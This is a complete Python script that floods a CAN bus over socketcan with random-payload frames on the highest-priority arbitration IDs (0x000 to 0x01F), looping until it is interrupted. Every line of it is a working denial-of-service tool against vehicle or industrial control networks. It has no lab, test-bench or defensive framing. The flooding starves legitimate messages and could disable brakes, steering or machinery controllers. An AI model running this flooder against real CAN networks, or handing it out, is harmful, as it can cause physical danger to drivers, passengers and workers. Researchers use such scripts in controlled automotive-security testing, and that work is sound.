import can
import random
import time

# Create a CAN bus instance
bus = can.interface.Bus(channel='can0', interface='socketcan')

# Flooding parameters
can_id_range = (0x000, 0x01F)  # Lower CAN IDs for high priority
data_length = 8  # Length of data to send
flood_rate = 0.01  # Time between messages in seconds (adjust for desired flood rate)

def create_high_priority_message(can_id):
    # Generate a CAN message with a specific CAN ID and random data
    data = bytearray(random.getrandbits(8) for _ in range(data_length))
    return can.Message(arbitration_id=can_id, data=data, is_extended_id=False)

try:
    while True:
        for can_id in range(can_id_range[0], can_id_range[1] + 1):
            message = create_high_priority_message(can_id)
            try:
                bus.send(message)
                print(f'Sent flood message: ID={hex(can_id)} Data={message.data.hex()}')
            except can.CanError as e:
                print(f"Failed to send message: {e}")
            time.sleep(flood_rate)  # Adjust flood rate as needed
except KeyboardInterrupt:
    print("Flooding stopped.")
finally:
    # Clean up and close the CAN bus interface properly
    bus.shutdown()
    print("CAN bus interface shut down properly.")
